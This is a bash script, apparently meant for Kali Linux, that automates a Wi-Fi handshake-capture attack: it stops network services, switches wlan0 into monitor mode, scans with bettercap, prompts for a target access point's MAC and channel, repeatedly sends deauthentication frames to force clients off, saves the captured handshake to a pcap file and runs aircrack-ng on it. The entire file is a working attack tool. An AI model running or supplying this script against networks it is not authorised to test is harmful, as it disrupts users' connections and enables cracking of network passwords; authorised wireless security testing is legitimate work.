#!/bin/bash

sudo killall wpa_supplicant
sudo killall NetworkManager
sudo killall avahi-daemon
sudo killall dhclient

echo "[*] Enabling wlan0 monitor mode..."
sudo ip link set wlan0 down
sleep 1
sudo iw wlan0 set monitor control
sleep 1
sudo ip link set wlan0 up
sleep 1

sudo timeout 10s bettercap -iface wlan0 -eval "wifi.recon on; sleep 5; wifi.show; sleep 5; exit"

echo
read -p "Enter MAC-address of AP: " mac
read -p "Enter channel of AP: " channel

sudo ip link set wlan0 down
sleep 1
sudo iw wlan0 set monitor control
sleep 1
sudo ip link set wlan0 up
sleep 1

echo "[*] Attack on $mac..."
sudo bettercap -iface wlan0 -eval "\
sleep 2; \
set wifi.channel $channel; \
sleep 2; \
set wifi.handshakes.file /home/kali/Desktop/hs-wlan0.pcap; \
sleep 3;\
wifi.recon on; \
sleep 3;\
wifi.assoc $mac; \
sleep 2;\
wifi.deauth $mac; \
sleep 8;\
wifi.deauth $mac; \
sleep 8;\
wifi.deauth $mac; \
sleep 8;\
wifi.deauth $mac; \
exit"

echo "[*] Analyzing handshake..."
sleep 20s
sudo aircrack-ng /home/kali/Desktop/hs-wlan0.pcap
